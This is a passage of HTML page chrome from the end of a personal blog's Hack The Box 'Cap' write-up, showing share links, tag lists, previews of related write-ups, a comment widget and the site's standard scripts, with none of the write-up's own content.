pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cap+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fcap%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cap+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fcap%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fcap%2F&text=Cap+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fcap%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bountyhunter/"><div class="card-body"> <em class="small" data-ts="1664262000" data-df="ll" > Sep 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want t...</p></div></div></a></div><div class="card"> <a href="/posts/knife/"><div class="card-body"> <em class="small" data-ts="1664521200" data-df="ll" > Sep 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start scanning the target machine. To do this, we will use nmap. The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Opt...</p></div></div></a></div><div class="card"> <a href="/posts/love/"><div class="card-body"> <em class="small" data-ts="1664348400" data-df="ll" > Sep 28, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Love Write-up</h3><div class="text-muted small"><p> Enumeration Nmap As always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved nmap. The scan that we will be using scans all the port range, displ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/knife/" class="btn btn-outline-primary" prompt="Older"><p>Knife Write-up</p></a> <a href="/posts/scrambled/" class="btn btn-outline-primary" prompt="Newer"><p>Scrambled Write-up</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/cap/'; this.page.identifier = '/posts/cap/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } const modeToggle = document.querySelector(".mode-toggle"); if (typeof modeToggle !== "undefined") { /* modeToggle.addEventListener('click', reloadDisqus); // not pretty for 'color-scheme' */ window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', reloadDisqus); } </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B9ZXXC99N4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-B9ZXXC99N4'); }); </script>
